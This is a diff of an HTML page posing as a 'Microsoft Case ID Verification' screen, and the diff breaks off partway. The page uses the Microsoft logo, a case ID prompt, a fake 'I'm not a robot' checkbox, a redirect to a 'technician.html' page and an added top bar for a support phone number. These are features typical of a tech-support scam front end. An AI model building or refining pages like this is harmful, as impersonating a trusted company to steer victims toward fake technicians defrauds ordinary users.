@@ -4,6 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Microsoft Case ID Verification</title>
+    
+    <!-- Google reCAPTCHA -->
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -12,78 +16,22 @@
             background-color: #f3f3f3;
             text-align: center;
         }
+        .top-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            background-color: #0078d4;
+            color: white;
+            font-size: 18px;
+        }
+        .support-number {
+            font-weight: bold;
+        }
         .container {
             max-width: 400px;
-            margin: 100px auto;
+            margin: 50px auto;
             background: white;
             padding: 20px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            border-radius: 5px;
-        }
-        .logo {
-            width: 150px;
-            margin-bottom: 20px;
-        }
-        input {
-            width: 90%;
-            padding: 10px;
-            font-size: 16px;
-            margin-bottom: 10px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-        button {
-            background-color: #0078d4;
-            color: white;
-            border: none;
-            padding: 10px 15px;
-            font-size: 16px;
-            cursor: pointer;
-            border-radius: 5px;
-        }
-        button:hover {
-            background-color: #005ea6;
-        }
-        .captcha {
-            margin: 15px 0;
-        }
-        .error {
-            color: red;
-            font-size: 14px;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="logo">
-        <h2>Verify Your Case ID</h2>
-        <p>Please enter your Case ID number to continue</p>
-        <input type="text" id="caseId" placeholder="Enter Case ID">
-        <div class="captcha">
-            <input type="checkbox" id="recaptcha"> I'm not a robot
-        </div>
-        <p id="errorMsg" class="error"></p>
-        <button onclick="verifyCase()">Continue</button>
-    </div>
-
-    <script>
-        function verifyCase() {
-            let caseId = document.getElementById("caseId").value;
-            let captcha = document.getElementById("recaptcha").checked;
-            let errorMsg = document.getElementById("errorMsg");
-            
-            if (!caseId) {
-                errorMsg.textContent = "Please enter a valid Case ID";
-                return;
-            }
-            if (!captcha) {
-                errorMsg.textContent = "Please complete the reCAPTCHA";
-                return;
-            }
-
-            errorMsg.textContent = "";
-            window.location.href = "technician.html"; // Redirect to technician details page
-        }
-    </script>
-</body>
-</html>
+   
